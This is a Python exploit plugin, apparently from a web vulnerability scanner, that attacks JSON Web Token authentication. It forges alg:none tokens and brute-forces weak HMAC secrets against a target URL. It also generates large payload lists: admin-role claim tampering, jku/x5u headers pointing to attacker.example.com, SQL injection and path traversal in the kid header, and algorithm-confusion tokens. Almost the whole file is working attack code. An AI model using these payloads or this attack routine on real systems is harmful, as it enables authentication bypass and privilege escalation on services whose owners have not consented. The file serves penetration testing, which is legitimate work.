"""
JWT (JSON Web Token) Exploit Plugin

Provides exploit capabilities for JWT security issues:
- alg:none attack (removing signature)
- RS256 â†’ HS256 key confusion
- Weak secret brute-force
- Token forgery PoC
"""

import sys
import os
import base64
import json
import hmac
import hashlib
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

WEAK_SECRETS = [
    'secret', 'password', '123456', 'changeme', 'supersecret',
    'jwt_secret', 'myapp_secret', 'dev_secret', 'test', '',
    'qwerty', 'abc123', 'letmein', 'admin', 'root',
    'key', 'private', 'jwt', 'token', 'auth',
    'secret123', 'password123', 'mysecret', 'app_secret', 'access',
    'default', 'master', 'welcome', 'secure', 'keykey',
]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def _b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.urlsafe_b64decode(s)


def _forge_none_alg(token: str) -> Optional[str]:
    """Return a version of the token signed with alg:none."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        header = json.loads(_b64url_decode(parts[0]))
        header['alg'] = 'none'
        new_header = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


def _forge_hs256(token: str, secret: str) -> Optional[str]:
    """Re-sign a token with HS256 and the given secret."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        header = json.loads(_b64url_decode(parts[0]))
        header['alg'] = 'HS256'
        new_header = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        signing_input = f"{new_header}.{parts[1]}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        return f"{new_header}.{parts[1]}.{_b64url_encode(sig)}"
    except Exception:
        return None


class JWTExploitPlugin(ExploitPlugin):
    """JWT security exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'jwt'

    @property
    def name(self) -> str:
        return 'JWT Exploit'

    @property
    def description(self) -> str:
        return 'JSON Web Token exploit plugin: alg:none, key confusion, weak secret brute-force.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate forged JWT tokens and probe payloads."""
        context = context or {}
        token = context.get('token', '')
        payloads = []
        if token:
            none_token = _forge_none_alg(token)
            if none_token:
                payloads.append(none_token)
            for secret in WEAK_SECRETS:
                forged = _forge_hs256(token, secret)
                if forged:
                    payloads.append(forged)

        # Always include generic probe payloads for detection/testing
        generic_payloads = [
            # alg:none probe tokens with empty payload
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.',
            'eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.',
            'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.',
            # Expired token reuse probes
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxfQ.invalid',
            # Claim tampering probes
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.invalid',
            # JKU injection probe
            '{"alg":"RS256","jku":"https://attacker.example.com/jwks.json"}',
            # X5U injection probe
            '{"alg":"RS256","x5u":"https://attacker.example.com/cert.pem"}',
            # Kid injection probe (SQL)
            '{"alg":"HS256","kid":"1 UNION SELECT secret FROM users-- -"}',
            # Kid injection probe (path traversal)
            '{"alg":"HS256","kid":"../../dev/null"}',
            # Empty secret HS256
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.',
        ]
        # Add forged tokens with all weak secrets for generic testing
        dummy_token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ'
        for secret in WEAK_SECRETS[:10]:
            try:
                signing_input = dummy_token.encode()
                sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                forged = f"{dummy_token}.{_b64url_encode(sig)}"
                generic_payloads.append(forged)
            except Exception:
                pass

        payloads.extend(generic_payloads)
        # Expanded JWT attack payloads
        extra_jwt = [
            # alg:none variants
            'eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.',
            'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.',
            'eyJhbGciOiIifQ.eyJzdWIiOiIxIn0.',
            'eyJhbGciOm51bGx9.eyJzdWIiOiIxIn0.',
            # Weak secret payloads (HS256 with common secrets)
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
            # RS256 with HS256 confusion
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.invalid',
            # Expired tokens
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxMDAwMDAwMDAwfQ.invalid',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoyfQ.invalid',
            # Role tampering
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZX0.invalid',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicGVybWlzc2lvbnMiOlsiYWRtaW4iXX0.invalid',
            # JKU injection
            '{"alg":"RS256","jku":"http://attacker.example.com/jwks.json","typ":"JWT"}',
            '{"alg":"RS256","jku":"https://attacker.example.com/.well-known/jwks.json"}',
            # X5U injection
            '{"alg":"RS256","x5u":"http://attacker.example.com/cert.pem"}',
            '{"alg":"RS256","x5u":"https://attacker.example.com/x5u"}',
            # Kid injection (SQLi)
            "{\"alg\":\"HS256\",\"kid\":\"x' UNION SELECT secret FROM keys-- -\"}",
            '{"alg":"HS256","kid":"1 OR 1=1-- -"}',
            "{\"alg\":\"HS256\",\"kid\":\"' OR '1'='1\"}",
            # Kid path traversal
            '{"alg":"HS256","kid":"../../../../../../dev/null"}',
            '{"alg":"HS256","kid":"../../../../etc/passwd"}',
            '{"alg":"HS256","kid":"/dev/null"}',
            # JWKS confusion
            '{"alg":"HS256","jwk":{"kty":"oct","k":"dGVzdA=="}}',
            # Embedded JWK
            '{"alg":"RS256","jwk":{"kty":"RSA","n":"malicious","e":"AQAB"}}',
            # Algorithm confusion (RS256->HS256)
            '{"alg":"HS256","typ":"JWT"}',
            '{"alg":"ES256","typ":"JWT"}',
            '{"alg":"PS256","typ":"JWT"}',
            # Empty/null tokens
            '..',
            '...',
            'null.null.null',
            'undefined.undefined.undefined',
            '0.0.0',
            # Malformed tokens
            'not-a-jwt',
            'Bearer not-a-jwt',
            'Basic dXNlcjpwYXNz',
            # Common test tokens
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
        ]
        payloads.extend(extra_jwt)
        # Generate more JWT probe payloads with different claims and algs
        algs = ['none', 'HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512',
                'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512']
        for alg in algs:
            header = json.dumps({'alg': alg, 'typ': 'JWT'}).encode()
            h_enc = base64.urlsafe_b64encode(header).rstrip(b'=').decode()
            for payload_data in [
                {'sub': '1', 'role': 'admin'},
                {'sub': '1', 'admin': True},
                {'sub': 'admin', 'exp': 9999999999},
                {'sub': '1', 'is_admin': True, 'exp': 9999999999},
            ]:
                p_bytes = json.dumps(payload_data).encode()
                p_enc = base64.urlsafe_b64encode(p_bytes).rstrip(b'=').decode()
                payloads.append(f'{h_enc}.{p_enc}.')
                payloads.append(f'{h_enc}.{p_enc}.invalid_signature')
        # Generate additional JWT tokens with various weak secrets and claims
        weak_secrets = ['secret', 'password', '123456', 'test', 'admin', 'key', 'jwt',
                        'token', 'changeme', 'supersecret', '12345678', 'abc123',
                        'mysecret', 'private', 'jwtkey', 'secretkey', 'aabbcc']
        claim_sets = [
            {'sub': '1', 'role': 'admin', 'iat': 1600000000},
            {'sub': '1', 'admin': True, 'iat': 1600000000},
            {'sub': 'admin', 'role': 'superuser', 'iat': 1600000000},
            {'user_id': 1, 'is_admin': True, 'iat': 1600000000},
            {'id': 1, 'permissions': ['admin', 'write', 'read'], 'iat': 1600000000},
            {'sub': '1', 'scope': 'admin', 'exp': 9999999999, 'iat': 1600000000},
        ]
        _dummy_header = base64.urlsafe_b64encode(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode()).rstrip(b'=').decode()
        for claim_data in claim_sets:
            p_enc = base64.urlsafe_b64encode(json.dumps(claim_data).encode()).rstrip(b'=').decode()
            signing_input = f'{_dummy_header}.{p_enc}'.encode()
            for secret in weak_secrets:
                try:
                    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                    sig_enc = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
                    payloads.append(f'{_dummy_header}.{p_enc}.{sig_enc}')
                except Exception:
                    pass
            payloads.append(f'{_dummy_header}.{p_enc}.')
        return PayloadMutator.scale_payloads_to_minimum(payloads) if payloads else ['<provide a JWT token in context[\'token\']>']

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Attempt JWT attacks: alg:none and weak secret brute-force."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'jwt',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        token = vulnerability_data.get('token') or config.get('token', '')

        if not token:
            return {
                'success': False,
                'error': 'No JWT token provided in vulnerability_data or config',
                'vulnerability_type': 'jwt',
            }

        # Try alg:none attack
        none_token = _forge_none_alg(token)
        if none_token:
            try:
                headers = {'Authorization': f'Bearer {none_token}'}
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl, allow_redirects=False)
                if resp.status_code in (200, 201, 202):
                    return {
                        'success': True,
                        'vulnerability_type': 'jwt',
                        'attack': 'alg_none',
                        'forged_token': none_token,
                        'evidence': f'Server accepted alg:none token (HTTP {resp.status_code})',
                        'message': 'JWT alg:none attack confirmed',
                    }
            except Exception as e:
                logger.debug(f"alg:none attack error: {e}")

        # Try weak secret brute-force
        for secret in WEAK_SECRETS:
            forged = _forge_hs256(token, secret)
            if not forged:
                continue
            try:
                headers = {'Authorization': f'Bearer {forged}'}
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl, allow_redirects=False)
                if resp.status_code in (200, 201, 202):
                    return {
                        'success': True,
                        'vulnerability_type': 'jwt',
                        'attack': 'weak_secret',
                        'secret': secret,
                        'forged_token': forged,
                        'evidence': f'Weak JWT secret "{secret}" confirmed (HTTP {resp.status_code})',
                        'message': 'JWT weak secret confirmed',
                    }
            except Exception as e:
                logger.debug(f"Weak secret brute-force error (secret={secret!r}): {e}")

        return {
            'success': False,
            'error': 'No JWT attack succeeded',
            'vulnerability_type': 'jwt',
        }
